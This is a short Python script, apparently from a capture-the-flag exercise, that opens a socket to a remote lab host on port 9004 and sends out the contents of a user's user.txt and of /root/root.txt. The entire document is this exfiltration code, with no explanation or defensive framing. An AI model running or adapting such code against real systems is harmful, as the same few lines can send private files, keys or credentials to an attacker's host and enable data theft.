import os, socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.XX.XX', 9004))
s.send(b"\n USER.TXT \n")
s.send(open('/home/sedric/user.txt', 'rb').read())
s.send(b"\n ROOT.TXT \n")
s.send(open('/root/root.txt', 'rb').read())
s.close()
